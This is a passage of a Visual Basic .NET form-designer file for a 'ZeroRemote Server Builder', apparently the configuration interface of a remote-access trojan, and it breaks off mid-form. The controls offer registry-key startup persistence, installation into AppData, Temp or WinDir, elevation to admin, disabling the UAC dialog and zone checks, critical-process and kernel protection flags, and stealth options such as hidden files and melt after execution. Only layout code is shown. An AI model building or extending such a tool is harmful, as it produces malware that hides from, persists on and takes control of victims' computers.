<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Builder
    Inherits System.Windows.Forms.Form

    'Das Formular überschreibt den Löschvorgang, um die Komponentenliste zu bereinigen.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Wird vom Windows Form-Designer benötigt.
    Private components As System.ComponentModel.IContainer

    'Hinweis: Die folgende Prozedur ist für den Windows Form-Designer erforderlich.
    'Das Bearbeiten ist mit dem Windows Form-Designer möglich.  
    'Das Bearbeiten mit dem Code-Editor ist nicht möglich.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Builder))
        Me.ImageListBuilder = New System.Windows.Forms.ImageList(Me.components)
        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
        Me.ButtonConnectionSpeed = New System.Windows.Forms.Button()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.TextBoxURL = New System.Windows.Forms.TextBox()
        Me.GroupBox2 = New System.Windows.Forms.GroupBox()
        Me.GroupBox4 = New System.Windows.Forms.GroupBox()
        Me.CheckBoxEnableInstallation = New System.Windows.Forms.CheckBox()
        Me.RadioButtonAppData = New System.Windows.Forms.RadioButton()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.RadioButtonTemp = New System.Windows.Forms.RadioButton()
        Me.RadioButtonWinDir = New System.Windows.Forms.RadioButton()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.GroupBox7 = New System.Windows.Forms.GroupBox()
        Me.ComboBoxRunOnce = New System.Windows.Forms.ComboBox()
        Me.LabelRunOnce = New System.Windows.Forms.Label()
        Me.TextBoxInstallFolderName = New System.Windows.Forms.TextBox()
        Me.LabelInstallFolderName = New System.Windows.Forms.Label()
        Me.TextBoxInstallFileName = New System.Windows.Forms.TextBox()
        Me.LabelInstallFileName = New System.Windows.Forms.Label()
        Me.TextBoxHKLM = New System.Windows.Forms.TextBox()
        Me.TextBoxHKCU = New System.Windows.Forms.TextBox()
        Me.PictureBox5 = New System.Windows.Forms.PictureBox()
        Me.CheckBoxHKLM = New System.Windows.Forms.CheckBox()
        Me.CheckBoxHKCU = New System.Windows.Forms.CheckBox()
        Me.CheckBoxElevate = New System.Windows.Forms.CheckBox()
        Me.StatusStrip1 = New System.Windows.Forms.StatusStrip()
        Me.ToolStripSplitButton1 = New System.Windows.Forms.ToolStripSplitButton()
        Me.ToolStripStatusLabelOptionInformation = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolTipInfo = New System.Windows.Forms.ToolTip(Me.components)
        Me.GroupBoxSecurityandProtection = New System.Windows.Forms.GroupBox()
        Me.ButtonAssemblyInfo = New System.Windows.Forms.Button()
        Me.ButtonAdvanced = New System.Windows.Forms.Button()
        Me.PictureBox4 = New System.Windows.Forms.PictureBox()
        Me.CheckBoxDisableUAC = New System.Windows.Forms.CheckBox()
        Me.CheckBoxProcessPersistance = New System.Windows.Forms.CheckBox()
        Me.CheckBoxDisableZoneChecks = New System.Windows.Forms.CheckBox()
        Me.PictureBox3 = New System.Windows.Forms.PictureBox()
        Me.CheckBoxBreakOnTermination = New System.Windows.Forms.CheckBox()
        Me.CheckBoxProcessProtection = New System.Windows.Forms.CheckBox()
        Me.GroupBox6 = New System.Windows.Forms.GroupBox()
        Me.CheckBoxVisibleMode = New System.Windows.Forms.CheckBox()
        Me.CheckBoxDisableShowHiddenFiles = New System.Windows.Forms.CheckBox()
        Me.CheckBoxMelt = New System.Windows.Forms.CheckBox()
        Me.CheckBoxHiddenAttributes = New System.Windows.Forms.CheckBox()
        Me.GroupBox8 = New System.Windows.Forms.GroupBox()
        Me.ButtonMutex = New System.Windows.Forms.Button()
        Me.TextBoxMutex = New System.Windows.Forms.TextBox()
        Me.GroupBoxIcon = New System.Windows.Forms.GroupBox()
        Me.PictureBoxIcon = New System.Windows.Forms.PictureBox()
        Me.ButtonSelectIcon = New System.Windows.Forms.Button()
        Me.CheckBoxTOS = New System.Windows.Forms.CheckBox()
        Me.LinkLabelTOS = New System.Windows.Forms.LinkLabel()
        Me.GroupBox3 = New System.Windows.Forms.GroupBox()
        Me.PictureBox2 = New System.Windows.Forms.PictureBox()
        Me.PictureBox6 = New System.Windows.Forms.PictureBox()
        Me.ButtonBuild = New System.Windows.Forms.Button()
        Me.GroupBox1.SuspendLayout()
        Me.GroupBox2.SuspendLayout()
        Me.GroupBox4.SuspendLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.GroupBox7.SuspendLayout()
        CType(Me.PictureBox5, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.StatusStrip1.SuspendLayout()
        Me.GroupBoxSecurityandProtection.SuspendLayout()
        CType(Me.PictureBox4, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.PictureBox3, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.GroupBox6.SuspendLayout()
        Me.GroupBox8.SuspendLayout()
        Me.GroupBoxIcon.SuspendLayout()
        CType(Me.PictureBoxIcon, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.GroupBox3.SuspendLayout()
        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.PictureBox6, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'ImageListBuilder
        '
        Me.ImageListBuilder.ImageStream = CType(resources.GetObject("ImageListBuilder.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.ImageListBuilder.TransparentColor = System.Drawing.Color.Transparent
        Me.ImageListBuilder.Images.SetKeyName(0, "toolbox--arrow.png")
        Me.ImageListBuilder.Images.SetKeyName(1, "servers-network.png")
        Me.ImageListBuilder.Images.SetKeyName(2, "block--arrow.png")
        Me.ImageListBuilder.Images.SetKeyName(3, "shield--arrow.png")
        Me.ImageListBuilder.Images.SetKeyName(4, "blue-document-invoice.png")
        Me.ImageListBuilder.Images.SetKeyName(5, "compile.png")
        '
        'GroupBox1
        '
        Me.GroupBox1.Controls.Add(Me.ButtonConnectionSpeed)
        Me.GroupBox1.Controls.Add(Me.Label1)
        Me.GroupBox1.Controls.Add(Me.TextBoxURL)
        Me.GroupBox1.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.GroupBox1.ForeColor = System.Drawing.SystemColors.InactiveCaptionText
        Me.GroupBox1.Location = New System.Drawing.Point(12, 12)
        Me.GroupBox1.Name = "GroupBox1"
        Me.GroupBox1.Size = New System.Drawing.Size(355, 62)
        Me.GroupBox1.TabIndex = 0
        Me.GroupBox1.TabStop = False
        Me.GroupBox1.Text = "Connection Settings"
        '
        'ButtonConnectionSpeed
        '
        Me.ButtonConnectionSpeed.Image = CType(resources.GetObject("ButtonConnectionSpeed.Image"), System.Drawing.Image)
        Me.ButtonConnectionSpeed.Location = New System.Drawing.Point(314, 26)
        Me.ButtonConnectionSpeed.Name = "ButtonConnectionSpeed"
        Me.ButtonConnectionSpeed.Size = New System.Drawing.Size(25, 23)
        Me.ButtonConnectionSpeed.TabIndex = 2
        Me.ButtonConnectionSpeed.UseVisualStyleBackColor = True
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.ForeColor = System.Drawing.Color.Black
        Me.Label1.Location = New System.Drawing.Point(16, 31)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(72, 13)
        Me.Label1.TabIndex = 1
        Me.Label1.Text = "Server URL"
        '
        'TextBoxURL
        '
        Me.TextBoxURL.ForeColor = System.Drawing.Color.Black
        Me.TextBoxURL.Location = New System.Drawing.Point(104, 26)
        Me.TextBoxURL.Name = "TextBoxURL"
        Me.TextBoxURL.Size = New System.Drawing.Size(195, 21)
        Me.TextBoxURL.TabIndex = 0
        Me.TextBoxURL.Text = "http://localhost/Zero"
        '
        'GroupBox2
        '
        Me.GroupBox2.Controls.Add(Me.GroupBox4)
        Me.GroupBox2.Controls.Add(Me.GroupBox7)
        Me.GroupBox2.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.GroupBox2.ForeColor = System.Drawing.SystemColors.InactiveCaptionText
        Me.GroupBox2.Location = New System.Drawing.Point(12, 133)
        Me.GroupBox2.Name = "GroupBox2"
        Me.GroupBox2.Size = New System.Drawing.Size(355, 283)
        Me.GroupBox2.TabIndex = 1
        Me.GroupBox2.TabStop = False
        Me.GroupBox2.Text = "Server Installation"
        '
        'GroupBox4
        '
        Me.GroupBox4.Controls.Add(Me.CheckBoxEnableInstallation)
        Me.GroupBox4.Controls.Add(Me.RadioButtonAppData)
        Me.GroupBox4.Controls.Add(Me.PictureBox1)
        Me.GroupBox4.Controls.Add(Me.RadioButtonTemp)
        Me.GroupBox4.Controls.Add(Me.RadioButtonWinDir)
        Me.GroupBox4.Controls.Add(Me.Label3)
        Me.GroupBox4.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.GroupBox4.Location = New System.Drawing.Point(14, 23)
        Me.GroupBox4.Name = "GroupBox4"
        Me.GroupBox4.Size = New System.Drawing.Size(325, 78)
        Me.GroupBox4.TabIndex = 2
        Me.GroupBox4.TabStop = False
        Me.GroupBox4.Text = "Installation Location"
        '
        'CheckBoxEnableInstallation
        '
        Me.CheckBoxEnableInstallation.AutoSize = True
        Me.CheckBoxEnableInstallation.ForeColor = System.Drawing.Color.Black
        Me.CheckBoxEnableInstallation.Location = New System.Drawing.Point(20, 25)
        Me.CheckBoxEnableInstallation.Name = "CheckBoxEnableInstallation"
        Me.CheckBoxEnableInstallation.Size = New System.Drawing.Size(174, 17)
        Me.CheckBoxEnableInstallation.TabIndex = 5
        Me.CheckBoxEnableInstallation.Text = "Enable Server Installation"
        Me.CheckBoxEnableInstallation.UseVisualStyleBackColor = True
        '
        'RadioButtonAppData
        '
        Me.RadioButtonAppData.AutoSize = True
        Me.RadioButtonAppData.Enabled = False
        Me.RadioButtonAppData.ForeColor = System.Drawing.Color.Black
        Me.RadioButtonAppData.Location = New System.Drawing.Point(20, 52)
        Me.RadioButtonAppData.Name = "RadioButtonAppData"
        Me.RadioButtonAppData.Size = New System.Drawing.Size(74, 17)
        Me.RadioButtonAppData.TabIndex = 1
        Me.RadioButtonAppData.TabStop = True
        Me.RadioButtonAppData.Text = "AppData"
        Me.RadioButtonAppData.UseVisualStyleBackColor = True
        '
        'PictureBox1
        '
        Me.PictureBox1.Image = CType(resources.GetObject("PictureBox1.Image"), System.Drawing.Image)
        Me.PictureBox1.Location = New System.Drawing.Point(258, 54)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(16, 16)
        Me.PictureBox1.TabIndex = 2
        Me.PictureBox1.TabStop = False
        '
        'RadioButtonTemp
        '
        Me.RadioButtonTemp.AutoSize = True
        Me.RadioButtonTemp.Enabled = False
        Me.RadioButtonTemp.ForeColor = System.Drawing.Color.Black
        Me.RadioButtonTemp.Location = New System.Drawing.Point(108, 52)
        Me.RadioButtonTemp.Name = "RadioButtonTemp"
        Me.RadioButtonTemp.Size = New System.Drawing.Size(57, 17)
        Me.RadioButtonTemp.TabIndex = 2
        Me.RadioButtonTemp.TabStop = True
        Me.RadioButtonTemp.Text = "Temp"
        Me.RadioButtonTemp.UseVisualStyleBackColor = True
        '
        'RadioButtonWinDir
        '
        Me.RadioButtonWinDir.AutoSize = True
        Me.RadioButtonWinDir.Enabled = False
        Me.RadioButtonWinDir.ForeColor = System.Drawing.Color.Black
        Me.RadioButtonWinDir.Location = New System.Drawing.Point(181, 52)
        Me.RadioButtonWinDir.Name = "RadioButtonWinDir"
        Me.RadioButtonWinDir.Size = New System.Drawing.Size(63, 17)
        Me.RadioButtonWinDir.TabIndex = 3
        Me.RadioButtonWinDir.TabStop = True
        Me.RadioButtonWinDir.Text = "WinDir"
        Me.RadioButtonWinDir.UseVisualStyleBackColor = True
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Enabled = False
        Me.Label3.ForeColor = System.Drawing.Color.Black
        Me.Label3.Location = New System.Drawing.Point(248, 54)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(37, 13)
        Me.Label3.TabIndex = 4
        Me.Label3.Text = "(     )"
        '
        'GroupBox7
        '
        Me.GroupBox7.Controls.Add(Me.ComboBoxRunOnce)
        Me.GroupBox7.Controls.Add(Me.LabelRunOnce)
        Me.GroupBox7.Controls.Add(Me.TextBoxInstallFolderName)
        Me.GroupBox7.Controls.Add(Me.LabelInstallFolderName)
        Me.GroupBox7.Controls.Add(Me.TextBoxInstallFileName)
        Me.GroupBox7.Controls.Add(Me.LabelInstallFileName)
        Me.GroupBox7.Controls.Add(Me.TextBoxHKLM)
        Me.GroupBox7.Controls.Add(Me.TextBoxHKCU)
        Me.GroupBox7.Controls.Add(Me.PictureBox5)
        Me.GroupBox7.Controls.Add(Me.CheckBoxHKLM)
        Me.GroupBox7.Controls.Add(Me.CheckBoxHKCU)
        Me.GroupBox7.Location = New System.Drawing.Point(14, 107)
        Me.GroupBox7.Name = "GroupBox7"
        Me.GroupBox7.Size = New System.Drawing.Size(325, 167)
        Me.GroupBox7.TabIndex = 5
        Me.GroupBox7.TabStop = False
        Me.GroupBox7.Text = "Server Startup"
        '
        'ComboBoxRunOnce
        '
        Me.ComboBoxRunOnce.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.ComboBoxRunOnce.Enabled = False
        Me.ComboBoxRunOnce.FormattingEnabled = True
        Me.ComboBoxRunOnce.Items.AddRange(New Object() {"Yes", "No"})
        Me.ComboBoxRunOnce.Location = New System.Drawing.Point(211, 135)
        Me.ComboBoxRunOnce.Name = "ComboBoxRunOnce"
        Me.ComboBoxRunOnce.Size = New System.Drawing.Size(97, 21)
        Me.ComboBoxRunOnce.TabIndex = 13
        '
        'LabelRunOnce
        '
        Me.LabelRunOnce.AutoSize = True
        Me.LabelRunOnce.Enabled = False
        Me.LabelRunOnce.ForeColor = System.Drawing.Color.Black
        Me.LabelRunOnce.Location = New System.Drawing.Point(15, 138)
        Me.LabelRunOnce.Name = "LabelRunOnce"
        Me.LabelRunOnce.Size = New System.Drawing.Size(169, 13)
        Me.LabelRunOnce.TabIndex = 12
        Me.LabelRunOnce.Text = "Use Registry RunOnce Key :"
        '
        'TextBoxInstallFolderName
        '
        Me.TextBoxInstallFolderName.Enabled = False
        Me.TextBoxInstallFolderName.Location = New System.Drawing.Point(171, 108)
        Me.TextBoxInstallFolderName.Name = "TextBoxInstallFolderName"
        Me.TextBoxInstallFolderName.Size = New System.Drawing.Size(138, 21)
        Me.TextBoxInstallFolderName.TabIndex = 11
        '
        'LabelInstallFolderName
        '
        Me.LabelInstallFolderName.AutoSize = True
        Me.LabelInstallFolderName.Enabled = False
        Me.LabelInstallFolderName.ForeColor = System.Drawing.Color.Black
        Me.LabelInstallFolderName.Location = New System.Drawing.Point(16, 111)
        Me.LabelInstallFolderName.Name = "LabelInstallFolderName"
        Me.LabelInstallFolderName.Size = New System.Drawing.Size(152, 13)
        Me.LabelInstallFolderName.TabIndex = 10
        Me.LabelInstallFolderName.Text = "Installation folder name :"
        '
        'TextBoxInstallFileName
        '
        Me.TextBoxInstallFileName.Enabled = False
        Me.TextBoxInstallFileName.Location = New System.Drawing.Point(170, 82)
        Me.TextBoxInstallFileName.Name = "TextBoxInstallFileName"
        Me.TextBoxInstallFileName.Size = New System.Drawing.Size(138, 21)
        Me.TextBoxInstallFileName.TabIndex = 9
        '
        'LabelInstallFileName
        '
        Me.LabelInstallFileName.AutoSize = True
        Me.LabelInstallFileName.Enabled = False
        Me.LabelInstallFileName.ForeColor = System.Drawing.Color.Black
        Me.LabelInstallFileName.Location = New System.Drawing.Point(15, 86)
        Me.LabelInstallFileName.Name = "LabelInstallFileName"
        Me.LabelInstallFileName.Size = New System.Drawing.Size(136, 13)
        Me.LabelInstallFileName.TabIndex = 2
        Me.LabelInstallFileName.Text = "Installation file name :"
        '
        'TextBoxHKLM
        '
        Me.TextBoxHKLM.Enabled = False
        Me.TextBoxHKLM.Location = New System.Drawing.Point(170, 55)
        Me.TextBoxHKLM.Name = "TextBoxHKLM"
        Me.TextBoxHKLM.Size = New System.Drawing.Size(138, 21)
        Me.TextBoxHKLM.TabIndex = 8
        '
        'TextBoxHKCU
        '
        Me.TextBoxHKCU.Enabled = False
        Me.TextBoxHKCU.Location = New System.Drawing.Point(170, 28)
        Me.TextBoxHKCU.Name = "TextBoxHKCU"
        Me.TextBoxHKCU.Size = New System.Drawing.Size(138, 21)
        Me.TextBoxHKCU.TabIndex = 7
        '
        'PictureBox5
        '
        Me.PictureBox5.Image = CType(resources.GetObject("PictureBox5.Image"), System.Drawing.Image)
        Me.PictureBox5.Location = New System.Drawing.Point(127, 56)
        Me.PictureBox5.Name = "PictureBox5"
        Me.PictureBox5.Size = New System.Drawing.Size(16, 16)
        Me.PictureBox5.TabIndex = 6
        Me.PictureBox5.TabStop = False
        '
        'CheckBoxHKLM
        '
        Me.CheckBoxHKLM.AutoSize = True
        Me.CheckBoxHKLM.Enabled = False
        Me.CheckBoxHKLM.ForeColor = System.Drawing.Color.Black
        Me.CheckBoxHKLM.Location = New System.Drawing.Point(19, 55)
        Me.CheckBoxHKLM.Name = "CheckBoxHKLM"
        Me.CheckBoxHKLM.Size = New System.Drawing.Size(137, 17)
        Me.CheckBoxHKLM.TabIndex = 1
        Me.CheckBoxHKLM.Text = "HKLM Startup (     )"
        Me.CheckBoxHKLM.UseVisualStyleBackColor = True
        '
        'CheckBoxHKCU
        '
        Me.CheckBoxHKCU.AutoSize = True
        Me.CheckBoxHKCU.Enabled = False
        Me.CheckBoxHKCU.ForeColor = System.Drawing.Color.Black
        Me.CheckBoxHKCU.Location = New System.Drawing.Point(19, 32)
        Me.CheckBoxHKCU.Name = "CheckBoxHKCU"
        Me.CheckBoxHKCU.Size = New System.Drawing.Size(105, 17)
        Me.CheckBoxHKCU.TabIndex = 0
        Me.CheckBoxHKCU.Text = "HKCU Startup"
        Me.CheckBoxHKCU.UseVisualStyleBackColor = True
        '
        'CheckBoxElevate
        '
        Me.CheckBoxElevate.AutoSize = True
        Me.CheckBoxElevate.ForeColor = System.Drawing.Color.Black
        Me.CheckBoxElevate.Location = New System.Drawing.Point(32, 20)
        Me.CheckBoxElevate.Name = "CheckBoxElevate"
        Me.CheckBoxElevate.Size = New System.Drawing.Size(246, 17)
        Me.CheckBoxElevate.TabIndex = 6
        Me.CheckBoxElevate.Text = "Elevate to admin after execution (     )"
        Me.CheckBoxElevate.UseVisualStyleBackColor = True
        '
        'StatusStrip1
        '
        Me.StatusStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripSplitButton1, Me.ToolStripStatusLabelOptionInformation})
        Me.StatusStrip1.Location = New System.Drawing.Point(0, 419)
        Me.StatusStrip1.Name = "StatusStrip1"
        Me.StatusStrip1.Size = New System.Drawing.Size(741, 22)
        Me.StatusStrip1.TabIndex = 2
        Me.StatusStrip1.Text = "StatusStrip1"
        '
        'ToolStripSplitButton1
        '
        Me.ToolStripSplitButton1.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image
        Me.ToolStripSplitButton1.DropDownButtonWidth = 0
        Me.ToolStripSplitButton1.Image = CType(resources.GetObject("ToolStripSplitButton1.Image"), System.Drawing.Image)
        Me.ToolStripSplitButton1.ImageTransparentColor = System.Drawing.Color.Magenta
        Me.ToolStripSplitButton1.Name = "ToolStripSplitButton1"
        Me.ToolStripSplitButton1.Size = New System.Drawing.Size(21, 20)
        Me.ToolStripSplitButton1.Text = "ToolStripSplitButton1"
        Me.ToolStripSplitButton1.TextImageRelation = System.Windows.Forms.TextImageRelation.ImageAboveText
        '
        'ToolStripStatusLabelOptionInformation
        '
        Me.ToolStripStatusLabelOptionInformation.BorderStyle = System.Windows.Forms.Border3DStyle.RaisedOuter
        Me.ToolStripStatusLabelOptionInformation.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ToolStripStatusLabelOptionInformation.ForeColor = System.Drawing.SystemColors.InactiveCaptionText
        Me.ToolStripStatusLabelOptionInformation.Name = "ToolStripStatusLabelOptionInformation"
        Me.ToolStripStatusLabelOptionInformation.Size = New System.Drawing.Size(165, 17)
        Me.ToolStripStatusLabelOptionInformation.Text = "ZeroRemote Server Builder"
        '
        'GroupBoxSecurityandProtection
        '
        Me.GroupBoxSecurityandProtection.Controls.Add(Me.ButtonAssemblyInfo)
        Me.GroupBoxSecurityandProtection.Controls.Add(Me.ButtonAdvanced)
        Me.GroupBoxSecurityandProtection.Controls.Add(Me.PictureBox4)
        Me.GroupBoxSecurityandProtection.Controls.Add(Me.CheckBoxDisableUAC)
        Me.GroupBoxSecurityandProtection.Controls.Add(Me.CheckBoxProcessPersistance)
        Me.GroupBoxSecurityandProtection.Controls.Add(Me.CheckBoxDisableZoneChecks)
        Me.GroupBoxSecurityandProtection.Controls.Add(Me.PictureBox3)
        Me.GroupBoxSecurityandProtection.Controls.Add(Me.CheckBoxBreakOnTermination)
        Me.GroupBoxSecurityandProtection.Controls.Add(Me.CheckBoxProcessProtection)
        Me.GroupBoxSecurityandProtection.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.GroupBoxSecurityandProtection.ForeColor = System.Drawing.SystemColors.InactiveCaptionText
        Me.GroupBoxSecurityandProtection.Location = New System.Drawing.Point(373, 12)
        Me.GroupBoxSecurityandProtection.Name = "GroupBoxSecurityandProtection"
        Me.GroupBoxSecurityandProtection.Size = New System.Drawing.Size(354, 195)
        Me.GroupBoxSecurityandProtection.TabIndex = 3
        Me.GroupBoxSecurityandProtection.TabStop = False
        Me.GroupBoxSecurityandProtection.Text = "Server Security and Protection"
        '
        'ButtonAssemblyInfo
        '
        Me.ButtonAssemblyInfo.ForeColor = System.Drawing.Color.Black
        Me.ButtonAssemblyInfo.Location = New System.Drawing.Point(200, 153)
        Me.ButtonAssemblyInfo.Name = "ButtonAssemblyInfo"
        Me.ButtonAssemblyInfo.Size = New System.Drawing.Size(142, 23)
        Me.ButtonAssemblyInfo.TabIndex = 12
        Me.ButtonAssemblyInfo.Text = "Assemblyinformation"
        Me.ButtonAssemblyInfo.UseVisualStyleBackColor = True
        '
        'ButtonAdvanced
        '
        Me.ButtonAdvanced.ForeColor = System.Drawing.Color.Black
        Me.ButtonAdvanced.Location = New System.Drawing.Point(24, 153)
        Me.ButtonAdvanced.Name = "ButtonAdvanced"
        Me.ButtonAdvanced.Size = New System.Drawing.Size(170, 23)
        Me.ButtonAdvanced.TabIndex = 11
        Me.ButtonAdvanced.Text = "Advanced Configurations"
        Me.ButtonAdvanced.UseVisualStyleBackColor = True
        '
        'PictureBox4
        '
        Me.PictureBox4.Image = CType(resources.GetObject("PictureBox4.Image"), System.Drawing.Image)
        Me.PictureBox4.Location = New System.Drawing.Point(255, 122)
        Me.PictureBox4.Name = "PictureBox4"
        Me.PictureBox4.Size = New System.Drawing.Size(16, 16)
        Me.PictureBox4.TabIndex = 10
        Me.PictureBox4.TabStop = False
        '
        'CheckBoxDisableUAC
        '
        Me.CheckBoxDisableUAC.AutoSize = True
        Me.CheckBoxDisableUAC.ForeColor = System.Drawing.Color.Black
        Me.CheckBoxDisableUAC.Location = New System.Drawing.Point(24, 121)
        Me.CheckBoxDisableUAC.Name = "CheckBoxDisableUAC"
        Me.CheckBoxDisableUAC.Size = New System.Drawing.Size(261, 17)
        Me.CheckBoxDisableUAC.TabIndex = 9
        Me.CheckBoxDisableUAC.Text = "Disable User Access Control Dialog (     )"
        Me.CheckBoxDisableUAC.UseVisualStyleBackColor = True
        '
        'CheckBoxProcessPersistance
        '
        Me.CheckBoxProcessPersistance.AutoSize = True
        Me.CheckBoxProcessPersistance.ForeColor = System.Drawing.Color.Black
        Me.CheckBoxProcessPersistance.Location = New System.Drawing.Point(24, 97)
        Me.CheckBoxProcessPersistance.Name = "CheckBoxProcessPersistance"
        Me.CheckBoxProcessPersistance.Size = New System.Drawing.Size(275, 17)
        Me.CheckBoxProcessPersistance.TabIndex = 8
        Me.CheckBoxProcessPersistance.Text = "Process Persistance (2 seperate processes)"
        Me.CheckBoxProcessPersistance.UseVisualStyleBackColor = True
        '
        'CheckBoxDisableZoneChecks
        '
        Me.CheckBoxDisableZoneChecks.AutoSize = True
        Me.CheckBoxDisableZoneChecks.ForeColor = System.Drawing.Color.Black
        Me.CheckBoxDisableZoneChecks.Location = New System.Drawing.Point(24, 74)
        Me.CheckBoxDisableZoneChecks.Name = "CheckBoxDisableZoneChecks"
        Me.CheckBoxDisableZoneChecks.Size = New System.Drawing.Size(140, 17)
        Me.CheckBoxDisableZoneChecks.TabIndex = 7
        Me.CheckBoxDisableZoneChecks.Text = "Disable Zonechecks"
        Me.CheckBoxDisableZoneChecks.UseVisualStyleBackColor = True
        '
        'PictureBox3
        '
        Me.PictureBox3.Image = CType(resources.GetObject("PictureBox3.Image"), System.Drawing.Image)
        Me.PictureBox3.Location = New System.Drawing.Point(268, 51)
        Me.PictureBox3.Name = "PictureBox3"
        Me.PictureBox3.Size = New System.Drawing.Size(16, 16)
        Me.PictureBox3.TabIndex = 6
        Me.PictureBox3.TabStop = False
        '
        'CheckBoxBreakOnTermination
        '
        Me.CheckBoxBreakOnTermination.AutoSize = True
        Me.CheckBoxBreakOnTermination.ForeColor = System.Drawing.Color.Black
        Me.CheckBoxBreakOnTermination.Location = New System.Drawing.Point(24, 51)
        Me.CheckBoxBreakOnTermination.Name = "CheckBoxBreakOnTermination"
        Me.CheckBoxBreakOnTermination.Size = New System.Drawing.Size(274, 17)
        Me.CheckBoxBreakOnTermination.TabIndex = 1
        Me.CheckBoxBreakOnTermination.Text = "Set Process BreakOnTermination flag (     )"
        Me.CheckBoxBreakOnTermination.UseVisualStyleBackColor = True
        '
        'CheckBoxProcessProtection
        '
        Me.CheckBoxProcessProtection.AutoSize = True
        Me.CheckBoxProcessProtection.ForeColor = System.Drawing.Color.Black
        Me.CheckBoxProcessProtection.Location = New System.Drawing.Point(24, 28)
        Me.CheckBoxProcessProtection.Name = "CheckBoxProcessProtection"
        Me.CheckBoxProcessProtection.Size = New System.Drawing.Size(304, 17)
        Me.CheckBoxProcessProtection.TabIndex = 0
        Me.CheckBoxProcessProtection.Text = "Set Process Kernel Security (Process Protection)"
        Me.CheckBoxProcessProtection.UseVisualStyleBackColor = True
        '
        'GroupBox6
        '
        Me.GroupBox6.Controls.Add(Me.CheckBoxVisibleMode)
        Me.GroupBox6.Controls.Add(Me.CheckBoxDisableShowHiddenFiles)
        Me.GroupBox6.Controls.Add(Me.CheckBoxMelt)
        Me.GroupBox6.Controls.Add(Me.CheckBoxHiddenAttributes)
        Me.GroupBox6.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.GroupBox6.ForeColor = System.Drawing.SystemColors.InactiveCaptionText
        Me.GroupBox6.Location = New System.Drawing.Point(373, 218)
        Me.GroupBox6.Name = "GroupBox6"
        Me.GroupBox6.Size = New System.Drawing.Size(354, 83)
        Me.GroupBox6.TabIndex = 4
        Me.GroupBox6.TabStop = False
        Me.GroupBox6.Text = "Stealth Options"
        '
        'CheckBoxVisibleMode
        '
        Me.CheckBoxVisibleMode.AutoSize = True
        Me.CheckBoxVisibleMode.Checked = True
        Me.CheckBoxVisibleMode.CheckState = System.Windows.Forms.CheckState.Checked
        Me.CheckBoxVisibleMode.ForeColor = System.Drawing.Color.Black
        Me.CheckBoxVisibleMode.Location = New System.Drawing.Point(168, 32)
        Me.CheckBoxVisibleMode.Name = "CheckBoxVisibleMode"
        Me.CheckBoxVisibleMode.Size = New System.Drawing.Size(180, 17)
        Me.CheckBoxVisibleMode.TabIndex = 3
        Me.CheckBoxVisibleMode.Text = "Visible Mode (Debugmode)"
        Me.CheckBoxVisibleMode.UseVisualStyleBackColor = True
        '
        'CheckBoxDisableShowHiddenFiles
        '
        Me.CheckBoxDisableShowHiddenFiles.AutoSize = True
        Me.CheckBoxDisableShowHiddenFiles.ForeColor = System.Drawing.Color.Black
        Me.CheckBoxDisableShowHiddenFiles.Location = New System.Drawing.Point(168, 55)
        Me.CheckBoxDisableShowHiddenFiles.Name = "CheckBoxDisableShowHiddenFiles"
        Me.CheckBoxDisableShowHiddenFiles.Size = New System.Drawing.Size(170, 17)
        Me.CheckBoxDisableShowHiddenFiles.TabIndex = 2
        Me.CheckBoxDisableShowHiddenFiles.Text = "Disable show hidden files"
        Me.CheckBoxDisableShowHiddenFiles.UseVisualStyleBackColor = True
        '
        'CheckBoxMelt
        '
        Me.CheckBoxMelt.AutoSize = True
        Me.CheckBoxMelt.ForeColor = System.Drawing.Color.Black
        Me.CheckBoxMelt.Location = New System.Drawing.Point(24, 55)
        Me.CheckBoxMelt.Name = "CheckBoxMelt"
        Me.CheckBoxMelt.Size = New System.Drawing.Size(139, 17)
        Me.CheckBoxMelt.TabIndex = 1
        Me.CheckBoxMelt.Text = "Melt after execution"
